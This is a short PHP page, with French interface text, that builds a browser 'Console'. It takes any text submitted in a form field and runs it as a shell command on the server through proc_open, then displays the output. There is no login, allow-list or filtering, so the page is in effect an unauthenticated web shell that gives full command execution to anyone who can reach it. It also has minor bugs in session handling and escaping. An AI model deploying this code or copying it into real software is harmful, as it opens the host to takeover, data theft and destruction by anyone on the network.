<!DOCTYPE html>
<html>
	<head>
		<title>Console</title>
		<meta charset="utf-8" />
		<style>
			h1 {
				text-align:center;
				color:white;
				font-size:40px;
			}
			body {
				background-color:grey;
			}
			#affichage {
				min-height:350px;
				max-width:1200px;
				padding:10px;
				
				margin-left:auto;
				margin-right:auto;
				
				background-color:black;
				color:white;
				border-radius:7px
			}
			#commande {
				width:300px;
				padding:5px;
				
				margin-top:10px;
				
				background-color:black;
				color:white;
				border:2px solid white;
				border-radius:7px
			}
			input[type=submit] {
				margin-top:10px;
			}
			form {
				text-align:center;
			}
		</style>
	</head>
	<body>
		<h1>Console</h1>
		<?php
			session_start();
			if (isset($_SESSION["nbr_bash"]) && isset($_SESSION["commande"]) && isset($_POST["commande"])) {
				$_SESSION["commande"][$_SESSION["nbr_bash"]]=$_POST["commande"];

				$descriptorspec = array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("file", "/tmp/error-output.txt", "a")
				 );
				 
				 $cwd = '/';
				 $env = array();

				$process = proc_open(
					$_SESSION["commande"][$_SESSION["nbr_bash"]],
					$descriptorspec,
					$pipes,
					$cwd,
					$env
				);
				if (is_resource($process)) {
					fwrite($pipes[0], '<?php print_r($_ENV); ?>');
					fclose($pipes[0]);
				
					$_SESSION["reponse"][$_SESSION["nbr_bash"]] =  stream_get_contents($pipes[1]);
					fclose($pipes[1]);
				
					$return_value = proc_close($process);
				}
				
				$_SESSION["nbr_bash"]++;
			} else {
				$_SESSION["nbr_bash"]=0;
				$_SESSION["commande"] = array(
					1 => "echo connexion"
				);
				$_SESSION["reponse"] = array(
					1 => "connexion"
				);
				session_write_close();
			}

			echo "<div id='affichage'>";
			for ($i=0;$i<$_SESSION["nbr_bash"];$i++) {
				echo "user >> ".htmlspecialchars($_SESSION["commande"][$i], ENT_QUOTES)."</br>";
				echo nl2br(htmlspecialchars($_SESSION["reponse"][$i]), ENT_QUOTES)."</br>";
			}
			echo "</div>";
		?>
		<form action='' method='POST'>
			<input id="commande" name='commande' placeholder="Entrez la commande bash" autofocus>
			<br/>
			<input type='submit' name='valider' value='valider'>
		</form>
	</body>
</html>